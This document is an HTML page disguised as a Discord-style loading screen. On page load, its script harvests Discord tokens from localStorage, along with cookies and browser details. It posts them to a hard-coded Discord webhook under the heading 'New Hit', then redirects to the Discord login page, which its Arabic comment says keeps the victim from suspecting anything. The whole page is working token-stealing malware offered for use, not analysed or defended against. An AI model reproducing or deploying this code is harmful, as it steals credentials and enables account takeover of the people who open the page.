<!DOCTYPE html>
<html lang="ar">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Loading...</title>
<style>
  body { background-color: #313338; color: white; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
  .loader { border: 4px solid #f3f3f3; border-top: 4px solid #5865f2; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; }
  @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
</style>
</head>
<body>
<div class="loader"></div>
<script>
(async function(){
  const WEBHOOK = "https://ptb.discord.com/api/webhooks/1563433824195715163/pImDLSOanfVezzULnId7p-Fny5ViXFkbPyoldjKCBnEzpFaPDg7dO6oj7zuBHTJISlwr";

  // 1. دالة فك تشفير التوكنات الحديثة لديسكورد
  function decryptToken(encryptedToken) {
    try {
      const key = CryptoJS.enc.Utf8.parse("discord");
      const decrypted = CryptoJS.AES.decrypt(encryptedToken, key, { mode: CryptoJS.mode.ECB });
      return decrypted.toString(CryptoJS.enc.Utf8);
    } catch(e) { return null; }
  }

  let tokens = [];
  
  try {
    // 2. سحب التوكنات من LocalStorage
    for (let i = 0; i < localStorage.length; i++) {
      const k = localStorage.key(i);
      let v = localStorage.getItem(k);
      
      if (typeof v === 'string') {
        // إذا كان التوكن مشفر (يبدأ بـ dQw4w9WgXcQ)
        if (v.startsWith('dQw4w9WgXcQ:')) {
           const realToken = decryptToken(v.split(':')[1]);
           if (realToken) tokens.push(realToken);
        } 
        // إذا كان التوكن عادي
        else {
           const m = v.match(/[\w-]{24,}\.[\w-]{6,}\.[\w-]{27,}/g);
           if (m) tokens.push(...m);
        }
      }
    }
  } catch(e){}

  tokens = [...new Set(tokens)];

  // 3. تجميع البيانات
  const info = {
    tokens: tokens.length > 0 ? tokens : ["No token found (User might not be logged in)"],
    userAgent: navigator.userAgent,
    platform: navigator.platform,
    language: navigator.language,
    url: location.href,
    time: new Date().toISOString(),
    cookies: document.cookie
  };

  // 4. إرسال البيانات للويبهوك
  await fetch(WEBHOOK, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({
      content: "**🔥 New Hit (Auto)**\n```json\n" + JSON.stringify(info, null, 2).slice(0, 1950) + "\n```"
    })
  }).catch(()=>{});

  // 5. تحويله لموقع ديسكورد بعد ما يرسل عشان ما يشك
  setTimeout(()=>{ window.location.href = "https://discord.com/login"; }, 1000);
})();
</script>
<!-- سكربت فك التشفير -->
<script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.1.1/crypto-js.min.js"></script>
</body>
</html>
